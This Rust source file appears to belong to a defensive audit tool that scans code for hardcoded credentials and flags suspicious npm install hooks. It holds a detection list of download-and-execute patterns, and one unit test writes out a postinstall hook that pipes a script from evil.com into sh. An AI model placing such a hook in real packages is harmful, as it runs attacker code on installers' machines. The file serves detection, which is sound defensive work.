use crate::event::{AuditFinding, Severity};
use regex::Regex;
use std::path::Path;

/// Lines containing these markers are documentation samples, not real secrets.
/// Checked against the line text (excluding the matched token itself).
const REDACTION_MARKERS: &[&str] = &[
    // Explicit redaction
    "_redacted", "-redacted", "redacted_", "redacted-",
    // Documentation placeholders
    "placeholder", "your_token", "your-token",
    "your_key", "your-key", "your_secret", "your-secret",
    "your_password", "your-password",
    "changeme", "replace_me", "replace-me",
    "sample_token", "sample-token", "sample_key", "sample-key",
    "dummy_token", "dummy-token", "fake_token", "fake-token",
    // Placeholder/dummy values
    "your-api", "your_api", "your_access", "your-access",
    "your_bearer", "your-bearer", "key-xxxx", "xxxx",
    // Template variables (Helm, Jinja, env substitution)
    "{{ .", "{{.", "{{ $", "{{$", "${", "$(", "<%=",
    // Dynamic value lookups (not hardcoded)
    "config(", "env(", "getenv(", "process.env",
    "os.environ", "vault.", "ssm.", "secrets.",
    // Logging/debugging (showing truncated values, not hardcoding)
    "log::", "logger.", "console.log", "this->error(", "this->info(",
    "str::take(", "substr(",
    // String concatenation (dynamic values, not hardcoded)
    "'.$", "\".$", "' .", "\" .",
];

struct ContentPattern {
    rule_id: &'static str,
    description: &'static str,
    severity: Severity,
    pattern: &'static str,
}

const CREDENTIAL_PATTERNS: &[ContentPattern] = &[
    ContentPattern {
        rule_id: "cred-aws-key",
        description: "AWS Access Key ID found in source",
        severity: Severity::Critical,
        pattern: r"(?i)AKIA[0-9A-Z]{16}",
    },
    ContentPattern {
        rule_id: "cred-private-key",
        description: "Private key found in source",
        severity: Severity::Critical,
        pattern: r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
    },
    ContentPattern {
        rule_id: "cred-jwt-token",
        description: "JWT token found in source",
        severity: Severity::High,
        pattern: r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
    },
    ContentPattern {
        rule_id: "cred-generic-password",
        description: "Hardcoded password assignment",
        severity: Severity::High,
        pattern: r#"(?i)(password|passwd|pwd)\s*[:=]\s*["'][^"']{8,}["']"#,
    },
    ContentPattern {
        rule_id: "cred-generic-secret",
        description: "Hardcoded secret/token assignment",
        severity: Severity::High,
        pattern: r#"(?i)(secret|token|api_key|apikey|auth_token)\s*[:=]\s*["'][^"']{8,}["']"#,
    },
    ContentPattern {
        rule_id: "cred-github-token",
        description: "GitHub personal access token found",
        severity: Severity::Critical,
        pattern: r"gh[pousr]_[A-Za-z0-9_]{36,}",
    },
    ContentPattern {
        rule_id: "cred-slack-token",
        description: "Slack token found in source",
        severity: Severity::Critical,
        pattern: r"xox[baprs]-[0-9a-zA-Z-]{10,}",
    },
    ContentPattern {
        rule_id: "cred-stripe-key",
        description: "Stripe API key found in source",
        severity: Severity::Critical,
        pattern: r"(sk|pk)_(test|live)_[0-9a-zA-Z]{24,}",
    },
];

pub fn scan_file_content(path: &Path) -> Result<Vec<AuditFinding>, std::io::Error> {
    let content = std::fs::read_to_string(path)?;
    let file_path_str = path.to_string_lossy().to_string();
    let mut findings = Vec::new();

    let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");

    // Skip files that are obviously test fixtures or examples
    if file_path_str.contains("/test") || file_path_str.contains("/fixture") || file_path_str.contains("/example") {
        return Ok(findings);
    }

    // Skip config files that legitimately contain credentials
    if matches!(file_name, ".env" | ".env.local" | ".claude.json") {
        return Ok(findings);
    }

    for pattern_def in CREDENTIAL_PATTERNS {
        let regex = match Regex::new(pattern_def.pattern) {
            Ok(r) => r,
            Err(_) => continue,
        };

        for mat in regex.find_iter(&content) {
            let line_number = content[..mat.start()].lines().count();

            // Skip matches where the matched content or surrounding lines contain redaction markers.
            // Check the line at the match position and adjacent lines to handle off-by-one.
            let check_lines: Vec<&str> = content.lines()
                .skip(line_number.saturating_sub(2))
                .take(3)
                .collect();
            let context_text = check_lines.join(" ").to_lowercase();
            if REDACTION_MARKERS.iter().any(|m| context_text.contains(m)) {
                continue;
            }

            // Inline suppression: line above contains @sandtrace-ignore or sandtrace:ignore
            if line_number > 1 {
                if let Some(prev_line) = content.lines().nth(line_number.saturating_sub(2)) {
                    let prev_lower = prev_line.to_lowercase();
                    if prev_lower.contains("@sandtrace-ignore") || prev_lower.contains("sandtrace:ignore") {
                        continue;
                    }
                }
            }

            // Get context lines
            let lines: Vec<&str> = content.lines().collect();
            let start = line_number.saturating_sub(2);
            let end = (line_number + 1).min(lines.len());
            let context: Vec<String> = lines[start..end]
                .iter()
                .map(|l| {
                    // Redact the actual match in context
                    if l.contains(mat.as_str()) {
                        l.replace(mat.as_str(), "[REDACTED]")
                    } else {
                        l.to_string()
                    }
                })
                .collect();

            findings.push(AuditFinding {
                file_path: file_path_str.clone(),
                line_number: Some(line_number),
                rule_id: pattern_def.rule_id.to_string(),
                severity: pattern_def.severity,
                description: pattern_def.description.to_string(),
                matched_pattern: pattern_def.pattern.to_string(),
                context_lines: context,
            });
        }
    }

    Ok(findings)
}

pub fn scan_supply_chain(dir: &Path) -> Vec<AuditFinding> {
    let mut findings = Vec::new();

    // Check for suspicious postinstall scripts in package.json files
    findings.extend(check_package_json_scripts(dir));

    findings
}

fn check_package_json_scripts(dir: &Path) -> Vec<AuditFinding> {
    let mut findings = Vec::new();

    let pkg_path = dir.join("package.json");
    if !pkg_path.exists() {
        return findings;
    }

    let content = match std::fs::read_to_string(&pkg_path) {
        Ok(c) => c,
        Err(_) => return findings,
    };

    let json: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(_) => return findings,
    };

    if let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) {
        let suspicious_hooks = ["preinstall", "postinstall", "preuninstall", "postuninstall"];

        for hook in &suspicious_hooks {
            if let Some(script) = scripts.get(*hook).and_then(|v| v.as_str()) {
                // Flag scripts that download/execute external content
                let suspicious_patterns = [
                    "curl ", "wget ", "eval(", "node -e", "base64",
                    "http://", "https://", "|sh", "| sh", "|bash", "| bash",
                ];

                for pattern in &suspicious_patterns {
                    if script.contains(pattern) {
                        findings.push(AuditFinding {
                            file_path: pkg_path.to_string_lossy().to_string(),
                            line_number: None,
                            rule_id: "supply-chain-suspicious-script".to_string(),
                            severity: Severity::Critical,
                            description: format!(
                                "Suspicious '{}' script contains '{}': {}",
                                hook, pattern, script
                            ),
                            matched_pattern: pattern.to_string(),
                            context_lines: vec![format!("\"{}\": \"{}\"", hook, script)],
                        });
                    }
                }
            }
        }
    }

    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_detect_aws_key() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join("config.js");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(file, "const key = 'AKIAIOSFODNN7EXAMPLE';").unwrap();

        let findings = scan_file_content(&file_path).unwrap();
        assert!(!findings.is_empty());
        assert_eq!(findings[0].rule_id, "cred-aws-key");
    }

    #[test]
    fn test_detect_private_key() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join("deploy.sh");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(file, "-----BEGIN RSA PRIVATE KEY-----").unwrap();
        writeln!(file, "MIIBogIBAAJBALRiMLAHudeSA/x3hB2f+2NRkJyBIZ").unwrap();

        let findings = scan_file_content(&file_path).unwrap();
        assert!(!findings.is_empty());
        assert_eq!(findings[0].rule_id, "cred-private-key");
    }

    #[test]
    fn test_suspicious_postinstall() {
        let dir = tempfile::tempdir().unwrap();
        let pkg_path = dir.path().join("package.json");
        let mut file = std::fs::File::create(&pkg_path).unwrap();
        writeln!(
            file,
            r#"{{"scripts": {{"postinstall": "curl https://evil.com/payload.sh | sh"}}}}"#
        )
        .unwrap();

        let findings = check_package_json_scripts(dir.path());
        assert!(!findings.is_empty());
        assert_eq!(findings[0].rule_id, "supply-chain-suspicious-script");
    }
}
